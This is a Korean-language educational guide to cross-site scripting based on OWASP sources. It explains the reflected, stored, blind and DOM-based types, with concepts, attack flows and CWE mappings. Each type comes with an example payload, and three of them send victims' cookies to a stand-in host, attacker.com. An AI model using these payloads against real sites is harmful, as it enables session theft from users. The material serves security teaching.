# XSS (Cross-Site Scripting) — OWASP 공식 기준

출처 (2026-10-27 확인, 공식 사이트 원문 직접 대조):
- https://top10.owasp.org/2025/A05_2025-Injection/
- https://community.owasp.org/attacks/xss
- https://community.owasp.org/attacks/DOM_Based_XSS

**분류 위치**: XSS도 SQL Injection과 마찬가지로 OWASP Top 10:2025의 **A05 Injection** 카테고리에 속합니다. 매핑된 CWE는 CWE-79(대표 항목), CWE-80(기본 XSS), CWE-83(속성 내 스크립트), CWE-86(식별자 내 무효 문자), CWE-644(HTTP 헤더 내 스크립트 구문)입니다. OWASP 원문은 "Injection includes Cross-site Scripting (high frequency, low impact) with more than 30k CVEs"라고 설명합니다.

> 주의: Top 10:2025 문서 자체에는 XSS의 하위 유형(Reflected/Stored/DOM 등)이 나와 있지 않습니다. 이 하위 유형들은 OWASP의 별도 커뮤니티 페이지(community.owasp.org/attacks/xss)에 정의되어 있습니다.

**개념**: XSS는 공격자가 집어넣은 JavaScript 코드가, 피해자의 브라우저 안에서 그 사이트의 권한으로 실행되는 공격입니다. 서버가 사용자 입력값을 화면에 출력할 때 특수문자(`<`, `>`, `"` 등)를 제대로 무력화(escape)하지 않으면, 입력값 안의 `<script>` 태그가 그대로 코드로 실행됩니다.

---

## 1. Reflected XSS — 난이도 하

**개념**: 공격자가 심은 스크립트가 서버에 저장되지 않고, 그 요청에 대한 **응답에 바로 반사**되어 돌아오는 유형입니다. OWASP 원문: "Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request."

**흐름**: 정상 사용자는 검색창에 검색어를 입력하면 "'검색어'에 대한 결과입니다"라는 문구가 화면에 그대로 뜹니다. 공격자는 검색어 자리에 스크립트를 넣은 링크를 만들어서 피해자에게 클릭하게 유도합니다. 피해자가 클릭하는 순간 그 스크립트가 피해자 브라우저에서 실행됩니다.

**명령어 예시** (피해자에게 보내는 링크):
```
https://target/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```
피해자가 이 링크를 클릭하면, 검색 결과 화면에 그 스크립트가 그대로 출력·실행되어 쿠키가 공격자 서버로 전송됩니다.

---

## 2. Stored XSS (Persistent XSS) — 난이도 중

**개념**: 공격자가 심은 스크립트가 서버의 데이터베이스나 게시판 글, 댓글 등에 **영구적으로 저장**되어, 그 글을 여는 모든 사용자의 브라우저에서 실행되는 유형입니다. OWASP 원문: "Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc."

**흐름**: 공격자는 게시판 글이나 프로필 자기소개란에 스크립트를 심은 글을 작성합니다. 서버가 이 입력값을 저장할 때나 출력할 때 무력화 처리를 안 하면, 그 글을 열어보는 모든 다른 사용자(관리자 포함)의 브라우저에서 스크립트가 실행됩니다. Reflected보다 피해 범위가 넓어서 난이도를 한 단계 더 높게 둡니다.

**명령어 예시** (게시판 글 작성 시 내용란에 그대로 입력):
```html
<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
```
이 글을 누군가 열람하는 순간 그 사람의 쿠키가 공격자 서버로 전송됩니다.

---

## 3. Blind XSS — 난이도 상

**개념**: OWASP 원문은 "a form of persistent XSS"(영구형 XSS의 한 형태)라고 설명합니다. Stored XSS와 비슷하지만, 공격자가 심은 페이로드가 **공격자 눈에 보이지 않는 화면**(예: 고객지원 문의 내용을 보는 관리자 전용 백오피스 화면)에서 실행된다는 점이 다릅니다. 공격자는 자기 공격이 성공했는지 직접 볼 수 없어서, 외부로 신호를 보내는 페이로드를 심어두고 결과를 기다려야 합니다.

**흐름**: 공격자가 고객지원 문의 폼(이름, 문의내용 등)에 스크립트를 심어 제출합니다. 이 폼의 내용은 공격자 화면에는 안 보이고, 나중에 관리자가 백오피스에서 문의 목록을 열 때만 실행됩니다. 공격자는 자기 서버로 신호가 오는지 계속 지켜봅니다.

**명령어 예시** (문의 폼의 "이름" 또는 "내용" 필드에 입력):
```html
<script src="https://attacker.com/blind.js"></script>
```
며칠 뒤 관리자가 문의 목록을 열람하는 순간, `blind.js`가 로드되면서 공격자 서버 로그에 관리자의 쿠키·화면 정보가 찍힙니다. 공격자는 보통 전용 도구(XSS Hunter 같은)로 이 신호를 수집합니다.

---

## 4. DOM Based XSS — 난이도 상

**개념**: OWASP 원문 정의: "DOM Based XSS... is an XSS attack wherein the attack payload is executed as a result of modifying the DOM 'environment' in the victim's browser used by the original client side script, so that the client side code runs in an 'unexpected' manner." 쉽게 말하면, 서버 응답 자체에는 악성 스크립트가 없는데, **브라우저 안에서 이미 돌고 있는 JavaScript 코드**가 URL 조각(`#` 뒤, 즉 fragment)이나 `location`, `document.referrer` 같은 값을 가져와서 화면에 그대로 끼워 넣는 과정에서 실행되는 유형입니다. 서버 로그에도 안 남고, 서버 쪽 코드를 봐도 안 보여서(클라이언트 쪽 JS 코드를 봐야 함) 찾기 어렵습니다.

**흐름**: 페이지 안의 JavaScript 코드가 `document.write(location.hash)` 처럼, URL의 `#` 뒷부분을 그대로 화면에 출력하는 로직이 있다고 가정합니다. 공격자는 `#` 뒤에 스크립트를 넣은 링크를 피해자에게 보냅니다. 이 부분은 서버로 전송되지 않고 브라우저 안에서만 처리되기 때문에, 서버 쪽 방어(입력값 무력화)로는 막을 수 없습니다.

**명령어 예시** (피해자에게 보내는 링크):
```
https://target/page#<img src=x onerror=alert(document.cookie)>
```
페이지의 클라이언트 스크립트가 `location.hash` 값을 그대로 DOM에 삽입하면, `onerror` 핸들러가 실행되며 쿠키가 노출됩니다.

---

## 참고 — 겹치는 CWE 및 분류 경계

- CWE-79(대표), 80(기본), 83(속성), 86(식별자), 644(HTTP 헤더)가 전부 A05 Injection 안에 있습니다.
- CWE-97(SSI, Server-Side Include)과 CWE-99(Resource Injection)는 이름이 비슷해 보이지만 XSS가 아니라 파일 포함 계열에 가까워 `04-file-system.md`에서 경계 항목으로 다룹니다.
- SQL Injection과 마찬가지로 A05 Injection 카테고리의 형제 항목입니다. 자세한 카테고리 설명은 `02-sql-injection.md` 참고.
